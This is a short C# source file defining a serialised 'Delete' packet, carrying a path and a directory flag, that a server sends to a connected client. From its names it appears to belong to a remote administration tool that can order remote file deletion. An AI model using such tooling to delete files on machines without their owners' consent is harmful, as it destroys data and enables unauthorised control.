using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Delete : IPacket
    {
        public Delete()
        {
        }

        public Delete(string path, bool isdir)
        {
            Path = path;
            IsDir = isdir;
        }

        [ProtoMember(1)]
        public string Path { get; set; }

        [ProtoMember(2)]
        public bool IsDir { get; set; }

        public void Execute(Client client)
        {
            client.Send<Delete>(this);
        }
    }
}